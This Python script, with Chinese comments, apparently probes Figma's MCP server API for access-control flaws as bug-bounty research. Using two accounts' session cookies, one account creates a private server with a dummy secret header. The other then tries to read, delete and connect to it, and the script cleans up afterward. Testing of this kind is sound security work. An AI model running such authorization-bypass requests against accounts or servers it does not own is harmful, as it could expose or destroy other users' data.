# -*- coding: utf-8 -*-
"""McpServer 归属校验细节:A 创建私有 server(带 customHeaders 假凭据) → B 越权读/删/连
目标结果: B 能读到 A 私有 server 的 customHeaders(未脱敏) 或 能用自己 fileKey 删除/连接 A 的 server
"""
import io, json, sys, urllib.error, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"   # A 的 Make 文件
B_MAKE = "76rf9byPrduayQieCWJkqV"   # B 的 Make 文件
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"


def load(path):
    return io.open(path, encoding='utf-8').read().strip().replace('\n', '; ')


AC = load('ws_cookie_A_new.txt')
BC = load('ws_cookie_B_new.txt')


def call(label, method, path, uid, ck, body=None):
    headers = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE,
               "Referer": BASE + "/", "Cookie": ck, "X-Figma-User-ID": uid}
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    req = urllib.request.Request(BASE + path, method=method, headers=headers, data=data)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode(errors='replace')
            print(f"[{label}] HTTP {r.status} {raw[:600]}")
            return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} {raw[:600]}")
        return e.code, raw


server_id = None
try:
    # 1. A 创建私有 server(带假凭据 header)
    status, raw = call("A create private server", "POST", "/api/mcp/servers", A_UID, AC, {
        "name": "h1-ownership-probe",
        "url": "https://example.com/mcp",
        "logo_url": None,
        "tagline": "temporary ownership probe",
        "description": "deleted after test",
        "fileKey": A_MAKE,
        "customHeaders": {"X-H1-Secret": "secret-value-12345"},
    })
    try:
        meta = json.loads(raw).get("meta") or {}
        server_id = (meta.get("server") or {}).get("id")
    except Exception:
        server_id = None
    print("server_id:", server_id)
    if not server_id:
        raise SystemExit(2)

    # 2. B 直接读 A 的私有 server
    call("B read A private server", "GET", f"/api/mcp/servers/{server_id}", B_UID, BC)

    # 3. B 用自己的 fileKey 删除 A 的 server(file_key 错位校验探测)
    call("B delete A server w/ own file_key", "DELETE",
         f"/api/mcp/servers/{server_id}?file_key={B_MAKE}", B_UID, BC)

    # 4. B 在自己的文件上创建 client 连接 A 的私有 server
    call("B create client on own file → A server", "POST", "/api/mcp/clients", B_UID, BC, {
        "mcpServerId": server_id, "fileKey": B_MAKE,
    })

    # 5. A 确认 server 是否仍存在
    call("A verify server exists", "GET", f"/api/mcp/servers/{server_id}", A_UID, AC)
finally:
    if server_id:
        call("A cleanup delete server", "DELETE",
             f"/api/mcp/servers/{server_id}?file_key={A_MAKE}", A_UID, AC)
